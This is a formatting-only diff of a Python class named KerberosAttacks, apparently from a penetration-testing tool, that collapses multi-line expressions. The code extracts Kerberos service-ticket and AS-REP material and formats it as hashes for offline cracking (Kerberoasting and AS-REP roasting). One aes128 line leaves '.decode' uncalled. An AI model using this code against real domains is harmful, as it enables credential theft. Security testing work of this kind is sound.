@@ -65,76 +65,44 @@ class KerberosAttacks:
         # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
         # last 12 bytes of the encrypted ticket represent the checksum of the decrypted
         # ticket
-        if (
-            decodedTGS["ticket"]["enc-part"]["etype"]
-            == constants.EncryptionTypes.rc4_hmac.value
-        ):
+        if decodedTGS["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.rc4_hmac.value:
             entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                 constants.EncryptionTypes.rc4_hmac.value,
                 username,
                 decodedTGS["ticket"]["realm"],
                 spn.replace(":", "~"),
-                hexlify(
-                    decodedTGS["ticket"]["enc-part"]["cipher"][:16].asOctets()
-                ).decode(),
-                hexlify(
-                    decodedTGS["ticket"]["enc-part"]["cipher"][16:].asOctets()
-                ).decode(),
+                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
+                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
             )
-        elif (
-            decodedTGS["ticket"]["enc-part"]["etype"]
-            == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value
-        ):
+        elif decodedTGS["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
             entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                 constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
                 username,
                 decodedTGS["ticket"]["realm"],
                 spn.replace(":", "~"),
-                hexlify(
-                    decodedTGS["ticket"]["enc-part"]["cipher"][-12:].asOctets()
-                ).decode(),
-                hexlify(
-                    decodedTGS["ticket"]["enc-part"]["cipher"][:-12:].asOctets()
-                ).decode,
+                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][-12:].asOctets()).decode(),
+                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][:-12:].asOctets()).decode,
             )
-        elif (
-            decodedTGS["ticket"]["enc-part"]["etype"]
-            == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
-        ):
+        elif decodedTGS["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                 constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
                 username,
                 decodedTGS["ticket"]["realm"],
                 spn.replace(":", "~"),
-                hexlify(
-                    decodedTGS["ticket"]["enc-part"]["cipher"][-12:].asOctets()
-                ).decode(),
-                hexlify(
-                    decodedTGS["ticket"]["enc-part"]["cipher"][:-12:].asOctets()
-                ).decode(),
+                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][-12:].asOctets()).decode(),
+                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][:-12:].asOctets()).decode(),
             )
-        elif (
-            decodedTGS["ticket"]["enc-part"]["etype"]
-            == constants.EncryptionTypes.des_cbc_md5.value
-        ):
+        elif decodedTGS["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.des_cbc_md5.value:
             entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                 constants.EncryptionTypes.des_cbc_md5.value,
                 username,
                 decodedTGS["ticket"]["realm"],
                 spn.replace(":", "~"),
-                hexlify(
-                    decodedTGS["ticket"]["enc-part"]["cipher"][:16].asOctets()
-                ).decode(),
-                hexlify(
-                    decodedTGS["ticket"]["enc-part"]["cipher"][16:].asOctets()
-                ).decode(),
+                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
+                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
             )
         else:
-            cme_logger.error(
-                "Skipping"
-                f" {decodedTGS['ticket']['sname']['name-string'][0]}/{decodedTGS['ticket']['sname']['name-string'][1]} due"
-                f" to incompatible e-type {decodedTGS['ticket']['enc-part']['etype']:d}"
-            )
+            cme_logger.error("Skipping" f" {decodedTGS['ticket']['sname']['name-string'][0]}/{decodedTGS['ticket']['sname']['name-string'][1]} due" f" to incompatible e-type {decodedTGS['ticket']['enc-part']['etype']:d}")
 
         return entry
 
@@ -160,9 +128,7 @@ class KerberosAttacks:
             pass
 
         # No TGT in cache, request it
-        userName = Principal(
-            self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
-        )
+        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
         # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
         # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
@@ -209,16 +175,12 @@ class KerberosAttacks:
         return TGT
 
     def getTGT_asroast(self, userName, requestPAC=True):
-        clientName = Principal(
-            userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value
-        )
+        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
         asReq = AS_REQ()
 
         domain = self.targetDomain.upper()
-        serverName = Principal(
-            "krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value
-        )
+        serverName = Principal("krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
         pacRequest = KERB_PA_PAC_REQUEST()
         pacRequest["include-pac"] = requestPAC
@@ -229,9 +191,7 @@ class KerberosAttacks:
 
         asReq["padata"] = noValue
         asReq["padata"][0] = noValue
-        asReq["padata"][0]["padata-type"] = int(
-            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
-        )
+        asReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
         asReq["padata"][0]["padata-value"] = encodedPacRequest
 
         reqBody = seq_set(asReq, "req-body")
@@ -274,11 +234,7 @@ class KerberosAttacks:
                 message = encoder.encode(asReq)
                 r = sendReceive(message, domain, self.kdcHost)
             elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_KEY_EXPIRED.value:
-                return (
-                    "Password of user "
-                    + userName
-                    + " expired but user doesn't require pre-auth"
-                )
+                return "Password of user " + userName + " expired but user doesn't require pre-auth"
             else:
                 cme_logger.debug(e)
                 return False
@@ -292,9 +248,7 @@ class KerberosAttacks:
             asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
         else:
             # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
-            cme_logger.debug(
-                "User %s doesn't have UF_DONT_REQUIRE_PREAUTH set" % userName
-            )
+            cme_logger.debug("User %s doesn't have UF_DONT_REQUIRE_PREAUTH set" % userName)
             return
 
         # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
